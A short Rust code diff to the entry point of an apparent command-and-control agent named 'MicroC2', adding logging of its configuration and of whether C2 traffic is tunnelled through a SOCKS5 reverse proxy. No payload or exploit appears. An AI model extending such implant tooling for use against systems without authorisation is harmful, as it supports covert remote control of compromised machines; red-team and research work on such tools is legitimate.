@@ -8,12 +8,22 @@ use std::env;
 use std::time::Duration;
 use tokio::time;
 use rand::Rng;
+use log::{info, warn};
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
+    env_logger::init();
     println!("[STARTUP] MicroC2 Agent starting...");
     
     let config = AgentConfig::load()?;
+    info!("[CONFIG] Loaded agent config: {:?}", config);
+
+    if config.socks5_enabled {
+        info!("[CONFIG] SOCKS5 is enabled. Proxy: 127.0.0.1:{}, all C2 traffic will use SOCKS5 Reverse Proxy tunnel.", config.socks5_port);
+    } else {
+        warn!("[CONFIG] SOCKS5 is disabled. Agent will use direct connection.");
+    }
+
     let server_addr = env::args()
         .nth(1)
         .unwrap_or_else(|| config.get_server_url());
